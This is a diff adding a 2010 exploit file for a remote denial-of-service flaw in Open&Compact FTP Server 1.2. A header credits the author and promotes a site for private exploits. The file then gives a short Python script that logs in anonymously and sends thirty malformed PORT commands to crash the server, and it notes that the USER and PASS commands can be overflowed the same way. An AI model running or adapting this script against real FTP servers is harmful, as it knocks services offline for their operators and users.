@@ -1,0 +1,40 @@
+=============================================================================
+# Tilte: Open&Compact Ftp Server 1.2 "PORT" command Remote Denial of Service.
+=============================================================================
+
+# Date....................: [22-05-2010]
+# Author..................: [Ma3sTr0-Dz]
+# Location ...............: [Algeria]
+# Software ...............: [Open&Comapct Ftp Server 1.2 "PORT" command Remote Denial of Service]
+# Impact..................: [Remote]
+# Site Software ..........: [http://sourceforge.net/projects/open-ftpd/]
+# Sptnx ..................: [CmOs_CLR & Sec4ever Memberz.]
+# Home : .................: [Www.Sec4ever.Com/home/ For Latest 2010 Localz & priv8 Exploits !]
+# Contact me : ...........: [o5m@hotmail.de] 
+# Vulnerability: Remote Denial of service .
+# Part ExplOit & Bug Codes :
+---
+
+#!/usr/bin/python
+
+import socket
+
+print '---------------------------------------------------------------------'
+print ' Open&Compact Ftp Server 1.2 "PORT" command Remote Denial of Service'
+print ' url: http://sourceforge.net/projects/open-ftpd'
+print ' author: Ma3sTr0-Dz'
+print ' mail: o5m@hotmail.de'
+print ' site: www.sec4ever.com'
+print ' USER and PASS methods are vulnerable too, just pass "A: " * 1000'
+print ' as buffer'
+print '---------------------------------------------------------------------'
+
+buffer = "A" * 5
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("127.0.0.1",21))
+s.send('USER %s\r\n' % "anonymous")
+
+for i in range(1,31):
+   s.send('PORT %s\n\n' % buffer)
+   print "Sending request n. " + str(i)
